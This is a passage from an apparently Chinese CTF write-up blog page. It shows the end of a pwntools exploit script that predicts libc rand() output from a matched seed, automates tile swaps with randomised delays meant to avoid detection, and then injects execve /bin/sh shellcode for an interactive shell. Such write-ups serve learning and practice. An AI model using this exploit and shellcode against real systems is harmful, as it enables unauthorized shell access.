&amp; <span class="number">0xFF</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;真实:&quot;</span>, <span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> real))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;预测:&quot;</span>, <span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> pred))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;匹配?&quot;</span>, real == pred)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> real != pred:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;预测与实际不匹配，脚本退出&quot;</span>)</span><br><span class="line">    p.close()</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;种子匹配成功！&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ────────────────────────────────────────────────</span></span><br><span class="line"><span class="comment"># 匹配成功 → 继续生成后续 rand 序列，并计算 swap 次数</span></span><br><span class="line"><span class="comment"># ────────────────────────────────────────────────</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新同步随机数生成器</span></span><br><span class="line">libc.srand(seed)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(HAND_SIZE):</span><br><span class="line">    libc.rand()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成后续可用的 rand 值（足够多）</span></span><br><span class="line">future_rand = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(MAX_SWAP_TRIES + <span class="number">100</span>):</span><br><span class="line">    future_rand.append(libc.rand() &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n后续 rand 值已生成（前10个示例）：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> future_rand[:<span class="number">10</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">current_hand = real[:]              <span class="comment"># 当前 hand 状态</span></span><br><span class="line">swap_counts = [<span class="number">0</span>] * HAND_SIZE       <span class="comment"># 记录每个位置需要 swap 多少次</span></span><br><span class="line">rand_idx = <span class="number">0</span>                        <span class="comment"># 指向 future_rand 的下标</span></span><br><span class="line">unfinished = <span class="built_in">set</span>(<span class="built_in">range</span>(HAND_SIZE))  <span class="comment"># 未完成的 tile</span></span><br><span class="line">execution_order = []                <span class="comment"># 记录处理顺序 (pos, times)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> unfinished:</span><br><span class="line">    best_pos = <span class="literal">None</span></span><br><span class="line">    best_tries = <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">list</span>(unfinished):</span><br><span class="line">        target = TARGET[pos]</span><br><span class="line">        <span class="keyword">if</span> current_hand[pos] == target:</span><br><span class="line">            unfinished.remove(pos)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 从当前 rand_idx 开始找最早匹配</span></span><br><span class="line">        <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(MAX_SWAP_TRIES):</span><br><span class="line">            idx = rand_idx + offset</span><br><span class="line">            <span class="keyword">if</span> idx &gt;= <span class="built_in">len</span>(future_rand):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> future_rand[idx] == target:</span><br><span class="line">                tries = offset + <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> tries &lt; best_tries:</span><br><span class="line">                    best_tries = tries</span><br><span class="line">                    best_pos = pos</span><br><span class="line">                <span class="keyword">break</span>  <span class="comment"># 找到最早的就停，不用再找更远的</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> best_pos <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;!!! 无法完成所有 tile，建议增大 MAX_SWAP_TRIES 或简化 TARGET&quot;</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 记录顺序和次数</span></span><br><span class="line">    execution_order.append((best_pos, best_tries))</span><br><span class="line">    swap_counts[best_pos] = best_tries</span><br><span class="line">    current_hand[best_pos] = TARGET[best_pos]</span><br><span class="line">    rand_idx += best_tries</span><br><span class="line">    unfinished.remove(best_pos)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nSwap 计划（贪心顺序）：&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> idx, (pos, times) <span class="keyword">in</span> <span class="built_in">enumerate</span>(execution_order, <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> times &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;idx:2d&#125;</span>. tile <span class="subst">&#123;pos:2d&#125;</span> → <span class="subst">&#123;times&#125;</span> 次&quot;</span>)</span><br><span class="line"></span><br><span class="line">total = <span class="built_in">sum</span>(swap_counts)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;总 swap 次数：<span class="subst">&#123;total&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ────────────────────────────────────────────────</span></span><br><span class="line"><span class="comment"># 自动化发送 swap 指令</span></span><br><span class="line"><span class="comment"># ────────────────────────────────────────────────</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;开始自动执行 swap 操作...&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;总 swap 次数：<span class="subst">&#123;<span class="built_in">sum</span>(swap_counts)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pos, times <span class="keyword">in</span> execution_order:  <span class="comment"># 按贪心顺序</span></span><br><span class="line">    <span class="keyword">if</span> times &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;tile <span class="subst">&#123;pos:2d&#125;</span> 需要 swap <span class="subst">&#123;times&#125;</span> 次&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">        <span class="comment"># 每次都完整发一次 &quot;1&quot; + tile</span></span><br><span class="line">        p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&quot;(0-13): &quot;</span>, <span class="built_in">str</span>(pos).encode())</span><br><span class="line">        time.sleep(<span class="number">0.01</span> + random.uniform(<span class="number">0</span>, <span class="number">0.02</span>))<span class="comment"># 延迟调小一点，随机防检测</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;所有 swap 已发送完成！&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">gdb.attach(p)</span></span><br><span class="line"><span class="string">pause()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 发送 play</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n已发送 Play！现在应该进入 read(0) 阶段&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动发送 execve /bin/sh shellcode</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">shellcode = (</span><br><span class="line">    <span class="string">b&quot;\x48\x31\xd2&quot;</span>             <span class="comment"># xor rdx, rdx</span></span><br><span class="line">    <span class="string">b&quot;\x52&quot;</span>                     <span class="comment"># push rdx</span></span><br><span class="line">    <span class="string">b&quot;\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68&quot;</span>  <span class="comment"># mov rax, &quot;/bin//sh&quot;</span></span><br><span class="line">    <span class="string">b&quot;\x50&quot;</span>                     <span class="comment"># push rax</span></span><br><span class="line">    <span class="string">b&quot;\x48\x89\xe7&quot;</span>             <span class="comment"># mov rdi, rsp</span></span><br><span class="line">    <span class="string">b&quot;\x52&quot;</span>                     <span class="comment"># push rdx</span></span><br><span class="line">    <span class="string">b&quot;\x57&quot;</span>                     <span class="comment"># push rdi</span></span><br><span class="line">    <span class="string">b&quot;\x48\x89\xe6&quot;</span>             <span class="comment"># mov rsi, rsp</span></span><br><span class="line">    <span class="string">b&quot;\x48\x31\xc0&quot;</span>             <span class="comment"># xor rax, rax</span></span><br><span class="line">    <span class="string">b&quot;\xb0\x3b&quot;</span>                 <span class="comment"># mov al, 0x3b</span></span><br><span class="line">    <span class="string">b&quot;\x0f\x05&quot;</span>                 <span class="comment"># syscall</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/random-seed%EF%BC%8Cshellcode/" rel="tag"># random-seed，shellcode</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/02/09/2026-02-09-Tic-Tac-Toe/" rel="prev" title="CTF题解：Tic-Tac-Toe">
+                  <i class="fa fa-angle-left"></i> CTF题解：Tic-Tac-Toe
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder"></span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
